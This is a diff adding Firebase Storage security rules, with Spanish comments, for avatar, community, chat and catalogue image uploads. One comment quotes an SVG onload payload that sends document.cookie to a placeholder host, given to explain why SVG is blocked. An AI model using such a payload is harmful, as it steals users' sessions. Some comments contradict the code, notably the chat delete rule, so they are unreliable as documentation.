@@ -1,0 +1,160 @@
+rules_version = '2';
+
+service firebase.storage {
+  match /b/{bucket}/o {
+
+    function isSignedIn() {
+      return request.auth != null;
+    }
+
+    function hasProfile() {
+      return isSignedIn()
+        && firestore.exists(/databases/(default)/documents/users/$(request.auth.uid));
+    }
+
+    // El rol del usuario, o null si no tiene.
+    //
+    // El mismo problema que en `isBanned`: si el documento no tiene
+    // campo `role` —y solo lo tiene quien es admin o moderador— el
+    // acceso directo lanza una excepcion de evaluacion. Con la
+    // comprobacion del `in` delante, un usuario normal devuelve `null`
+    // y no esta baneado ni es admin, que es lo que tiene que pasar.
+    function myRole() {
+      return hasProfile()
+        && 'role' in firestore.get(/databases/(default)/documents/users/$(request.auth.uid)).data
+        ? firestore.get(/databases/(default)/documents/users/$(request.auth.uid)).data.role
+        : null;
+    }
+
+    function isAdmin() {
+      return myRole() == 'admin';
+    }
+
+    function isModerator() {
+      return myRole() == 'admin' || myRole() == 'moderator';
+    }
+
+    // Si el usuario esta baneado.
+    //
+    // El `.data.isBanned` lleva la comprobacion "el campo existe"
+    // detras, y no es por estetica: si el documento del usuario no
+    // tiene ese campo —y la mayoria no lo tiene, porque solo se escribe
+    // cuando alguien banea a alguien— el acceso directo a la propiedad
+    // lanza `property is undefined on object` y la REGLA ENTERA falla.
+    //
+    // Eso no es un detalle: al fallar la regla, la subida se rechaza
+    // con un error de evaluacion en vez de con un "no". Y como la
+    // funcion se llama al principio de la regla, el efecto es que
+    // NINGUN usuario puede subir a las carpetas de avatar ni de
+    // comunidad. Es decir: la web entera sin fotos.
+    //
+    // Con el `in` delante, un usuario sin el campo no esta baneado, que
+    // es lo correcto.
+    function isBanned() {
+      return hasProfile()
+        && 'isBanned' in firestore.get(/databases/(default)/documents/users/$(request.auth.uid)).data
+        && firestore.get(/databases/(default)/documents/users/$(request.auth.uid)).data.isBanned == true;
+    }
+
+    // ────────────────────────────────────────────────────────
+    // SI ES UNA IMAGEN DE VERDAD
+    // ────────────────────────────────────────────────────────
+    //
+    // Que el tipo diga "image/*" no basta. El SVG es el problema: es
+    // una imagen, pero tambien es un fichero de texto que puede
+    // llevar JavaScript dentro,
+    //
+    //     <svg onload="fetch('//sitio/que/sea?c='+document.cookie)">
+    //
+    // y si alguien abre el fichero directamente en su pestaña, ese
+    // codigo se ejecuta con el origen del proyecto. Como las fotos de
+    // los chats son publicas, cualquiera podria subirlo y enticing a
+    // otra persona a abrirlo.
+    //
+    // La lista es cerrada a proposito, y son los tres formatos que
+    // accepta el selector de archivos de la web (`accept="image/*"`
+    // mas la validacion del cliente). Un SVG que alguien pase a mano
+    // se rechaza aqui.
+    function esImagenSegura() {
+      return request.resource.contentType.matches(
+                'image/(jpeg|png|gif|webp|avif|heic|heif|bmp|x-icon)')
+        && request.resource.size < 5 * 1024 * 1024;
+    }
+
+    // Si el usuario es miembro de esa conversacion.
+    //
+    // Hace falta en las carpetas de los chats, que son del grupo y no
+    // de la persona: sin esta comprobacion, cualquier usuario con
+    // sesion podria subir a la carpeta de un grupo ajeno con solo
+    // saber su identificador.
+    //
+    // `firestore.get` sobre un documento que no existe falla, y con
+    // eso la funcion da `false`: un chat borrado deja de ser
+    // escribible, que es lo que tiene que pasar.
+    function isChatMember(chatId) {
+      return isSignedIn()
+        && firestore.get(/databases/(default)/documents/chats/$(chatId)).data.memberIds
+             .hasAny([request.auth.uid]);
+    }
+
+    // Cada usuario escribe unicamente dentro de su propia carpeta
+    match /avatars/{uid}/{fileName} {
+      allow read: if true;
+      allow write: if isSignedIn()
+                   && request.auth.uid == uid
+                   && esImagenSegura();
+      allow delete: if isSignedIn() && (request.auth.uid == uid || isAdmin());
+    }
+
+    // Imagenes de los hilos y comentarios de la comunidad.
+    //
+    // Cualquier usuario con sesion puede subir, pero SOLO a su
+    // propia carpeta: el {uid} del path tiene que coincidir con
+    // quien escribe, así que nadie puede subir a nombre de otro
+    // ni llenar la carpeta de alguien con imágenes que no son
+    // suyas. Un usuario baneado se queda sin subir, igual que
+    // se queda sin publicar.
+    match /community/{uid}/{fileName} {
+      allow read: if true;
+      allow write: if isSignedIn()
+                   && request.auth.uid == uid
+                   && !isBanned()
+                   && esImagenSegura();
+      allow delete: if isSignedIn() && (request.auth.uid == uid || isAdmin());
+    }
+
+    // Imagenes de los chats: la foto del grupo y las fotos de los
+    // mensajes.
+    //
+    // Aqui la carpeta NO es la del usuario, sino la del chat, porque
+    // la foto de un grupo la cambia el dueño pero la ven todos los
+    // miembros. Comprobar la pertenencia contra el documento del chat
+    // es lo que evita que cualquiera suba a la carpeta de otro grupo:
+    // si no eres miembro, la regla lo dice.
+    //
+    // El borrado es más restrictivo que en el resto de carpetas. La
+    // foto anterior a un cambio la borra el servicio en cuanto ha
+    // escrito la nueva, y eso solo lo puede hacer quien esté
+    // cambiando el avatar, que es el dueño. Cualquier otro borrado se
+    // rechaza.
+    match /chats/{chatId}/{folder}/{fileName} {
+      allow read: if true;
+      allow write: if isSignedIn()
+                   && !isBanned()
+                   && esImagenSegura()
+                   && isChatMember(chatId);
+      allow delete: if isSignedIn() && (isChatMember(chatId) || isAdmin());
+    }
+
+    // Contenido del catalogo (portadas, banners, miniaturas, fanarts)
+    match /content/{allPaths=**} {
+      allow read: if true;
+      allow write: if (isAdmin() || isModerator()) && esImagenSegura();
+      allow delete: if isAdmin() || isModerator();
+    }
+
+    match /{allPaths=**} {
+      allow read, write: if false;
+    }
+  }
+}
